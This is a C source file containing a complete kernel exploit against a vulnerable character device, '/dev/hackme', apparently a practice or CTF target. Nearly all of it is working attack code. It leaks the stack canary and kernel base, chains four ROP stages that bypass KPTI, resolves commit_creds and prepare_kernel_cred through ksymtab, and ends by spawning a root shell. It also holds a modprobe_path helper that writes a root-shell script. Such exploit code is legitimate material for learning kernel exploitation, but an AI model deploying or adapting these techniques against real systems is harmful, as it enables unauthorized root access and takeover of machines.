#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/utsname.h>

typedef void* (*fp_commit_creds)(void *);
typedef void* (*fp_prepare_kernel_cred)(void *);

// commands
#define DEV_PATH "/dev/hackme"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(char* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", (void*)tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

unsigned long get_kernel_sym(char *name) {
        FILE *f;
        unsigned long addr;
        char dummy;
        char sname[512];
        struct utsname ver;
        int ret;
        int rep = 0;
        int oldstyle = 0;

        f = fopen("/proc/kallsyms", "r");
        if (f == NULL) {
                f = fopen("/proc/ksyms", "r");
                if (f == NULL)
                        goto fallback;
                oldstyle = 1;
        }

repeat:
        ret = 0;
        while(ret != EOF) {
                if (!oldstyle)
                        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
                else {
                        ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
                        if (ret == 2) {
                                char *p;
                                if (strstr(sname, "_O/") || strstr(sname, "_S."))
                                        continue;
                                p = strrchr(sname, '_');
                                if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
                                        p = p - 4;
                                        while (p > (char *)sname && *(p - 1) == '_')
                                                p--;
                                        *p = '\0';
                                }
                        }
                }
                if (ret == 0) {
                        fscanf(f, "%s\n", sname);
                        continue;
                }
                if (!strcmp(name, sname)) {
                        fprintf(stdout, "[+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");
                        fclose(f);
                        return addr;
                }
        }

        fclose(f);
        if (rep)
                return 0;
fallback:
        uname(&ver);
        if (strncmp(ver.release, "2.6", 3))
                oldstyle = 1;
        sprintf(sname, "/boot/System.map-%s", ver.release);
        f = fopen(sname, "r");
        if (f == NULL)
                return 0;
        rep = 1;
        goto repeat;
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /home/user/hax; echo 'setsid cttyhack setuidgid 0 \
           /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("/home/user/roooot");
}

unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

int fd;
uint64_t buf[50];

uint64_t cookie;
uint64_t k_base;
uint64_t pop_rax_ret;
uint64_t pop_rdi_rbp_ret;
uint64_t kpti_tramp;
// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;
uint64_t read_mem_pop1_ret;
/*
 struct kernel_symbol {
	  int value_offset;
	  int name_offset;
	  int namespace_offset;
};
*/
uint64_t ksymtab_prepare_cred;
uint64_t prepare_cred;
uint64_t ksymtab_commit_creds;
uint64_t commit_creds;
uint64_t cred_struct;

void get_shell(void)
{
    puts("r00t");
    system("/bin/sh");
}

void leak_commit_creds(void);
void leak_prepare_cred(void);
void prepare_cred_done(void);

void stage1()
{
    size_t off = 16;

    buf[off++] = cookie;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = pop_rax_ret;
    buf[off++] = ksymtab_commit_creds - 0x10;
    buf[off++] = read_mem_pop1_ret;
    buf[off++] = 0x0;
    buf[off++] = kpti_tramp;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = (uint64_t)leak_commit_creds;
    buf[off++] = user_cs;
    buf[off++] = user_rflags;
    buf[off++] = user_sp;
    buf[off++] = user_ss;

    if (write(fd, buf, sizeof(buf)) < 0) {
        perror("write");
    }
}

void stage2()
{
    size_t off = 16; 

    buf[off++] = cookie;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = pop_rax_ret;
    buf[off++] = ksymtab_prepare_cred - 0x10;
    buf[off++] = read_mem_pop1_ret;
    buf[off++] = 0x0;
    buf[off++] = kpti_tramp;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = (uint64_t)leak_prepare_cred;
    buf[off++] = user_cs;
    buf[off++] = user_rflags;
    buf[off++] = user_sp;
    buf[off++] = user_ss;

    if (write(fd, buf, sizeof(buf)) < 0) {
        perror("write");
    }
}

void stage3()
{
    size_t off = 16;
    buf[off++] = cookie;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = pop_rdi_rbp_ret;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = prepare_cred;
    buf[off++] = kpti_tramp;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = (uint64_t)prepare_cred_done;
    buf[off++] = user_cs;
    buf[off++] = user_rflags;
    buf[off++] = user_sp;
    buf[off++] = user_ss;

    if (write(fd, buf, sizeof(buf)) < 0) {
        perror("write");
    }
}

void stage4()
{
    size_t off = 16;
    buf[off++] = cookie;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = pop_rdi_rbp_ret;
    buf[off++] = cred_struct;
    buf[off++] = 0x0;
    buf[off++] = commit_creds;
    buf[off++] = kpti_tramp;
    buf[off++] = 0x0;
    buf[off++] = 0x0;
    buf[off++] = (uint64_t)get_shell;
    buf[off++] = user_cs;
    buf[off++] = user_rflags;
    buf[off++] = user_sp;
    buf[off++] = user_ss;

    if (write(fd, buf, sizeof(buf)) < 0) {
        perror("write");
    }
}

void leak_commit_creds(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov commit_creds, rax;"
        ".att_syntax;"
    );

    commit_creds = (int)commit_creds + ksymtab_commit_creds;

    printf("Leaked commit_kernel_creds: 0x%lx \n", commit_creds);

    puts("Starting stage2");
    stage2();
}

void leak_prepare_cred(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov prepare_cred, rax;"
        ".att_syntax;"
    );

    prepare_cred = (int)prepare_cred + ksymtab_prepare_cred;
    printf("Leaked prepare_kernel_cred: 0x%lx \n", prepare_cred);

    puts("Starting stage3");
    stage3();
}

void prepare_cred_done(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov cred_struct, rax;"
        ".att_syntax;"
    );

    puts("Starting stage4");
    stage4();
}

/*
 * The real deal. All security mechanisms are on.
 */

int main(void)
{
    save_state();

    fd = open(DEV_PATH, O_RDWR);

    if (fd < 0) {
        perror("open");
    }

    if (read(fd, buf, sizeof(buf)) < 0) {
        perror("read");
    }

    cookie = buf[16];
    k_base = buf[38] - 0xa157UL;
    kpti_tramp = k_base + 0x200f10UL + 22UL;
    pop_rax_ret = k_base + 0x4d11UL;
    read_mem_pop1_ret = k_base + 0x4aaeUL;
    pop_rdi_rbp_ret = k_base + 0x38a0UL;
    ksymtab_prepare_cred = k_base + 0xf8d4fcUL;
    ksymtab_commit_creds = k_base + 0xf87d90UL;

    printf("canary: %p \n", cookie);
    printf("kbase: %p \n", k_base);

    puts("Starting stage1");
    stage1();

    return 0;
}

